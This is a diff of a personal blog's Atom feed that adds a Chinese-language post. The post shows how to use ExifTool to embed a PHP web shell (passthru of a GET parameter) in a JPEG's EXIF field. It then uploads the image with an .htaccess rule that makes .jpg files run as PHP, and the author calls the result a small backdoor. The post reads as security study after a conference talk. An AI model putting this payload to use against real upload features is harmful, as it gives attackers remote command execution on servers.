@@ -4,7 +4,7 @@
   <title><![CDATA[atdog's Blog]]></title>
   <link href="http://atdog.github.com/atom.xml" rel="self"/>
   <link href="http://atdog.github.com/"/>
-  <updated>2013-02-27T15:54:02+08:00</updated>
+  <updated>2013-02-27T16:15:08+08:00</updated>
   <id>http://atdog.github.com/</id>
   <author>
     <name><![CDATA[atdog]]></name>
@@ -12,6 +12,56 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Image exif tool]]></title>
+    <link href="http://atdog.github.com/blog/2013/02/27/image-exif-tool/"/>
+    <updated>2013-02-27T15:58:00+08:00</updated>
+    <id>http://atdog.github.com/blog/2013/02/27/image-exif-tool</id>
+    <content type="html"><![CDATA[<p>最近在網路上找Image exif的修改工具 for Mac，</p>
+
+<p>最後找到 <a href="http://www.sno.phy.queensu.ca/~phil/exiftool/">ExifTool</a></p>
+
+<p>不過，為什麼要找Exif的修改工具呢？</p>
+
+<p>其實是在看到<a href="http://blog.orange.tw">Orange</a>在Web Conf所講的<a href="http://www.slideshare.net/p8361/webconf-2013best-practices-the-upload">Talk</a>後才想找的，</p>
+
+<p>安裝完 <a href="http://www.sno.phy.queensu.ca/~phil/exiftool/">ExifTool</a> 之後，</p>
+
+<p>1.觀看圖片的Exif資訊</p>
+
+<pre><code>$ exiftool test.jpg
+</code></pre>
+
+<p>2.修改圖片的Exif資訊，e.g., Document Name</p>
+
+<pre><code>$ exiftool exiftool -documentname='&lt;?php passthru($_GET[cmd]); __halt_compiler();?&gt;' test.jpg
+$ file test.jpg
+./test.jpg JPEG: image data, JFIF standard 1.01
+</code></pre>
+
+<p>大概是像上面這樣，</p>
+
+<p>所以我們可以透過上傳test.jpg 以及 .htaccess</p>
+
+<pre><code>$ cat .htaccess
+addhandler application/x-httpd-php .jpg
+</code></pre>
+
+<p>這是為了做什麼？</p>
+
+<p>上傳後執行可以看到這樣的畫面</p>
+
+<p><img src="images/imageup1.png" title="image upload" alt="image upload" /></p>
+
+<br>
+
+
+<p><img src="images/imageup2.png" title="image upload" alt="image upload" /></p>
+
+<p>其實就是個小後門!</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Wix.com]]></title>
